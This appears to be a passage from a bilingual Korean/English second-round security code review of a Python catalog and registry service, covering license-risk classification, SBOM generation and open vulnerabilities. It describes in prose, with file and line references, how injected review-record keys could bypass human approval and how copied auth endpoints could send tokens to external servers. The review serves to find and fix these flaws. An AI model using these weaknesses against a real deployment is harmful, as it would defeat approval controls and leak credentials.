    if any(x in v for x in _HIGH) and "lgpl" not in v:
        return "high"
    if any(x in v for x in _MED):
        return "medium"
    if any(x in v for x in _LOW):
        return "low"
    return "unknown"


def _dist_license(dist: md.Distribution) -> str | None:
    meta = dist.metadata
    lic = meta.get("License-Expression") or meta.get("License")
    if lic and len(lic) < 80 and "\n" not in lic:
        return lic
    classifiers = [c.split("::")[-1].strip() for c in meta.get_all("Classifier") or [] if c.startswith("License ::")]
    return classifiers[0] if classifiers else (lic.splitlines()[0][:80] if lic else None)
```
**분석 / Analysis (Level 2)**
- L517-533 `license_risk`: 소문자 부분 문자열 분류. high 가 먼저인데 `lgpl` 이 들어 있으면 high 에서 뺀다(LGPL 은 medium). 판단 불가는 `unknown`.
- L536-542 `_dist_license`: `License-Expression`(PEP 639) → 짧은 한 줄 `License` → `License ::` 분류자 마지막 조각 → 긴 본문의 첫 줄 80자.
**짚어볼 점 / Watch-outs**
- [위험:낮음] L520·L527·L531: 부분 문자열 일치라 오분류가 난다 — `CC0 1.0 Universal`·`Universal Permissive License v1.0` 은 `rsal`(univе**rsal**)에 걸려 high, `Proprietary, limited use` 는 `mit`(li**mit**ed)에 걸려 low, `GPL-3.0 OR LGPL-3.0` 은 `lgpl` 예외로 medium(같은 로직을 앱 import 없이 스크래치 스크립트로 재현해 확인). SBOM 위험 요약·카탈로그 `license_risk` 표시(`app/api/catalog.py:27`)가 틀어진다. 시험(`test/test_catalog.py:195-196`)은 정상 사례만. 최소 수정: SPDX 식별자 토큰 단위 비교(`OR`·`AND`·`WITH`·괄호로 분해) + 단어 경계 정규식.

```python path=app/services/registry.py lines=545-575
def sbom(db: Session) -> dict:
    components = []
    seen = set()
    for dist in md.distributions():
        name = dist.metadata.get("Name")
        if not name or name.lower() in seen:
            continue
        seen.add(name.lower())
        lic = _dist_license(dist)
        components.append({"type": "library", "name": name, "version": dist.version,
                           "purl": f"pkg:pypi/{name.lower()}@{dist.version}",
                           "licenses": [{"license": {"name": lic}}] if lic else [],
                           "properties": [{"name": "agentnexus:license_risk", "value": license_risk(lic)},
                                          {"name": "agentnexus:scope", "value": "platform"}]})
    for item in db.scalars(select(CatalogItem).where(CatalogItem.status.in_(("approved", "active")))):
        components.append({"type": "service" if item.type != "model" else "machine-learning-model",
                           "name": item.name, "version": item.version, "bom-ref": item.id,
                           "licenses": [{"license": {"name": item.license}}] if item.license else [],
                           "properties": [{"name": "agentnexus:license_risk", "value": license_risk(item.license)},
                                          {"name": "agentnexus:scope", "value": f"catalog:{item.type}"},
                                          {"name": "agentnexus:status", "value": item.status}]})
    summary: dict[str, int] = {}
    for c in components:
        risk = next(p["value"] for p in c["properties"] if p["name"] == "agentnexus:license_risk")
        summary[risk] = summary.get(risk, 0) + 1
    return {"bomFormat": "CycloneDX", "specVersion": "1.6", "serialNumber": f"urn:uuid:{uuid.uuid4()}", "version": 1,
            "metadata": {"timestamp": utcnow().isoformat(),
                         "component": {"type": "application", "name": "AgentNexus", "version": APP_VERSION},
                         "properties": [{"name": f"agentnexus:risk:{k}", "value": str(v)}
                                        for k, v in sorted(summary.items())]},
            "components": components}
```
**분석 / Analysis (Level 2)**
- L548-558: 실행 중인 Python 환경의 모든 배포판 — 이름 소문자 중복 제거, purl, 라이선스, 위험·범위 속성.
- L559-565: 승인·활성 카탈로그 항목을 서비스(모델은 `machine-learning-model`) 구성 요소로.
- L566-575: 위험 등급별 건수를 메타데이터 속성으로, CycloneDX 1.6 문서. `serialNumber` 는 매번 새 UUID(같은 내용이라도 다른 BOM 으로 보인다).
- 범위: JS 번들·OS 패키지·컨테이너 이미지는 없다 — 1차 심층 리뷰 지적(`.review/REVIEW-InDepth.md:256`)과 같다.
**짚어볼 점 / Watch-outs**
- [위험:낮음] L555: purl 이름 정규화가 소문자뿐이다. pypi purl 은 `_`·`.` 를 `-` 로 정규화한 이름을 쓰므로(`typing_extensions` → `typing-extensions`) 취약점 스캐너가 매칭하지 못할 수 있다. 최소 수정: `re.sub(r"[-_.]+", "-", name).lower()`.
- [위험:낮음] L548: 요청마다 설치된 모든 배포판 메타데이터를 읽는다 — `catalog:read`(일반 사용자 포함, `app/core/auth.py:20`)로 반복 호출 가능하고 ops 도 부른다(`app/api/ops.py:797`). 프로세스 수명 동안 배포판 목록은 바뀌지 않으므로 라이브러리 부분은 캐시하면 된다.

## 파일 평가 / File Assessment
- 강점: (1) 서명 검증이 문서의 `alg` 가 아니라 신뢰 키 종류로 알고리즘을 정하고, 서명 범위가 `_meta.auth`·remotes 까지 문서 전체다(`app/services/registry.py:75-80`, `:105-119`). (2) 버전 불변(같은 버전 다른 내용 409, `:180-186`), 대기 버전은 item 표시를 바꾸지 않고 승인 때 반영(`:191-195`, `:229`), 질의 `status:` 로 가시성 우회 불가(`:386-387`). (3) Epic 39 의 게시 메타데이터 시크릿 참조 제거(`:297-303`, 접두 끝 `/` 로 이웃 namespace 충돌 방지)와 회귀 시험(`test/test_review_fixes.py:271-282`), 미러별 네임스페이스 glob·자동 승인·서명 필수 설정과 항목별 커밋의 부분 성공.
- 위험: (1) [위험:높음] 게시 문서의 `_anx_*` 심사 기록 주입 → 고위험 도구 사람 승인 해제·trusted 승격(`app/services/registry.py:134-135`, `:172`, `:192` → `app/services/review.py:176-179`, `app/api/catalog.py:475-487`, `app/services/governance.py:60`). (2) [위험:중간] 등록 경로의 전송처 통제 공백 — 옵션 `endpoint` 덮어쓰기(`:290`, `:311-312`)와 게시 `_meta.auth` 전송처 키 복사(`:297`, auto_approve 와 결합). (3) [위험:중간] 비 ApiError 독 항목 → 미러 동기화·예약 보존 정지(`:457-466`), 게시자 ≠ 소유자 버전 게시(`:168-190`), 익명 전체 행 스캔(`:395-411`).
- 개선 권고(영향순): (1) `_anx_` 접두를 게시 입력에서 거부·제거하고 `_apply_version` 은 item 쪽 `_anx_*` 만 유지 + 회귀 시험. (2) `register` 에 principal 을 넘겨 endpoint·auth 전송처 변경에 `secrets.check_destination` 과 같은 규칙, 외부 AS 허용 목록, auto_approve 항목의 auth 전송처는 `pending` 유지. (3) `import_entries`·`registry_jobs` 의 항목·소스 단위 예외 격리 + 서명 블록·PEM 형식 검사 + 스키마 길이를 DB 와 일치, 기존 항목 게시는 소유자·승인자만, `search` 를 DB 페이지네이션으로.
- 파일 위험 등급 / Risk grade: 높음 — 미해결 [위험:높음] 1건(심사 기록 주입) + 카탈로그·공급망 경계 모듈에 [위험:중간] 5건(등록 endpoint·auth 전송처·독 항목·소유자 확인·익명 스캔).
- 재읽기 권고 레벨: 2 — 같은 메타데이터가 게시(이 파일) → 승인 효과(`app/services/review.py:158-198`) → 등록·즉시 사용(`app/api/catalog.py:295-487`) → 게이트웨이(`app/services/mcp_gateway.py`·`governance.py`)로 흘러가며 의미가 바뀐다. 키별(`_anx_*`·`_meta.auth`·`remotes`·`_meta.hosted`)로 "누가 쓰고 누가 믿는가" 를 짝지어 다시 읽을 것.

## 1차 리뷰 대비 / vs 1st Review
1차 라인 리뷰 대상이 아니었으므로(부록 A, `.review/CODE-REVIEW-Lv2/INDEX.md:335`) 1차 INDEX §4.1·§4.2·§4.3 과 1차 심층 리뷰(`.review/REVIEW-InDepth.md`) 중 이 파일 관련 항목만 비교한다. `.review/delegated/` 와 `.review/round2/delegated/` 에는 이 파일 관련 지적이 없다(grep `catalog`·`publish`·`registry` — `delegated/code-review.md:159` 의 hosted 캐시 키는 mcp_gateway 소관).

| 1차 지적 (1차 보고서 위치·요지) | 2차 상태 | 근거(현재 path:line) |
|---|---|---|
| 1차 INDEX §4.3 핫스팟 #1(`.review/CODE-REVIEW-Lv2/INDEX.md:228`)·§4.1-5(`:218`) 사용자 병합 가능한 `auth` 로 임의 시크릿 외부 전송 — 이 파일 해당분: 게시 server.json `_meta.auth` 를 등록 때 그대로 복사 | 부분 해결 | 남의 `secret_ref`·tls 시크릿 제거 `app/services/registry.py:297-303`, 시험 `test/test_review_fixes.py:271-282`. 전송처 키 복사(`:297`)·옵션 endpoint 덮어쓰기(`:290`, `:311-312`)·`_meta.hosted.secret_ref` 미검사(`:306`)는 남음 |
| 1차 INDEX §4.3 핫스팟 #2(`INDEX.md:229`) 외부 AS 에 사용자 원본 토큰 — 등록 메타데이터 경로 | 미해결(이 경로) | 게시 `_meta.auth.authorization_server`·`token_endpoint` 가 그대로 인스턴스로 `:297`, 자동 승인 `:199-200`, 소비 `app/services/mcp_gateway.py:144-176`. VERIFY 기존 결정(`.review/round2/VERIFY.md:53`)의 전제(운영자 승인)가 auto_approve 에서 빠진다 |
| 1차 INDEX §4.2(`INDEX.md:225`) 라우터 import 부수효과 `@registry.register_handler` | 미해결(설계 유지) | 전역 등록 `:250-258`, 등록처 `app/api/a2a.py:718`·`app/api/llm.py:271`, 전 라우터 무조건 import `app/main.py:14-29` |
| 1차 INDEX §4.1-7(`INDEX.md:220`) 상태 전이의 비원자성 — 이 파일 해당분 | 미해결 | 게시 읽기-검사-쓰기 `:168-190`, `(item_id, version)` 유일 제약 없음 `migrations/versions/0001_initial_schema.py:731-743` |
| 1차 INDEX §4.1-6(`INDEX.md:219`) 조용한 예외 삼킴 — 이 파일 해당분 | 해결(삼킴 없음) — 반대로 너무 좁게 잡는 문제 | 원격 오류는 상태 기록 후 502 `:505-512`. 항목 단위는 `ApiError` 만 잡아 독 항목이 전체를 멈춤 `:457-466` |
| 1차 심층 리뷰 — 앱 내 라이선스 위험 분류 규칙(`.review/REVIEW-InDepth.md:229`)·런타임 SBOM 은 Python + 카탈로그만(`:256`) | 미해결(범위 그대로) | 규칙 `:517-533`(부분 문자열 오분류 — 위 L520 Watch-out), SBOM `:545-575`(JS·OS·이미지 없음) |
